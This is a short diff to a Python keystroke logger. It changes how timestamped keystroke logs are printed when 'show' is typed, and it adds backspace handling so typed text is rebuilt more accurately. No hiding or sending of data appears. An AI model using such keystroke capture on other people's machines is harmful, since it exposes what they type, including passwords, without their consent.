@@ -14,10 +14,11 @@ def on_press(key):
     pressed_keys.append(str(key))
     print(pressed_keys[-4:])
     if pressed_keys[-4:] == ["'s'","'h'","'o'","'w'"]:
-        print(log_dict)
+        for time, value in log_dict.items():
+             print(time + '\n' + '  ' + value)
 
     count += 1
-    print('{0} pressed', format(key))
+    # print('{0} pressed', format(key))
 
     if count >= 10:
         count = 0
@@ -27,11 +28,15 @@ def on_press(key):
 def write_file(keys):
     ct = datetime.datetime.now()
     now = ct.strftime("%d-%m-%y %H:%M ")
+
     data_str = ''
-    ct = datetime.datetime.now()
     for key in keys:
+        # print(data_str)
         k = str(key).replace("'","")
 
+        if k.find('backspace') > 0:
+                # print('back')
+                data_str = data_str[:-1]
         if k.find('space') > 0:
                 data_str += ' '
         elif k.find('Key') == -1:
